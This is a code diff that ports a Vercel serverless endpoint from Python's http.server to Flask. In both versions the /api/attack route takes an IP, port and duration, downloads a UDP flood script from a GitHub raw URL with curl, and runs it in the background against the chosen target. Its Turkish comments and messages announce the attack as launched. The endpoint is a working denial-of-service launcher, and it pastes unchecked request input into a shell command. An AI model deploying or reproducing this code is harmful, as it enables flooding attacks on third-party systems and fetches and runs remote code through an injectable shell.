@@ -1,26 +1,26 @@
-from http.server import BaseHTTPRequestHandler
+from flask import Flask, request
 import subprocess
-import urllib.parse
 
-class handler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        # URL'den parametreleri al (ip, port, sure)
-        query = urllib.parse.urlparse(self.path).query
-        params = urllib.parse.parse_qs(query)
+app = Flask(__name__)
+
+@app.route('/api/attack')
+def attack():
+    # URL'den parametreleri alıyoruz: /api/attack?ip=1.1.1.1&port=80&time=10
+    target = request.args.get('ip')
+    port = request.args.get('port', '80')
+    duration = request.args.get('time', '10')
+
+    if target:
+        # UDP Scriptini indir ve arkada çalıştır
+        # /tmp klasörü Vercel'de yazılabilir tek yerdir
+        cmd = f"curl -s -L -o /tmp/udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py && python3 /tmp/udp.py {target} {port} 100 {duration}"
         
-        target = params.get('ip', [''])[0]
-        port = params.get('port', ['80'])[0]
-        duration = params.get('time', ['10'])[0]
+        # subprocess.Popen kullanarak fonksiyonun bitmesini beklemeden saldırıyı başlatıyoruz
+        subprocess.Popen(cmd, shell=True)
+        
+        return f"🚀 Edge Saldirisi {target} Hedefine Baslatildi!", 200
+    else:
+        return "❌ Hata: IP adresi eksik!", 400
 
-        if target:
-            # UDP Scriptini indir ve arkada çalıştır
-            cmd = f"curl -s -L -o /tmp/udp.py https://raw.githubusercontent.com/HAYALETBEY437/ordu/main/udp.py && python3 /tmp/udp.py {target} {port} 100 {duration}"
-            subprocess.Popen(cmd, shell=True)
-            
-            self.send_response(200)
-            self.end_headers()
-            self.wfile.write(f"🚀 Edge Saldirisi Basladi: {target}".encode())
-        else:
-            self.send_response(400)
-            self.end_headers()
-            self.wfile.write(b"Hata: IP lazim kanka.")
+# Vercel için gerekli handler
+handler = app
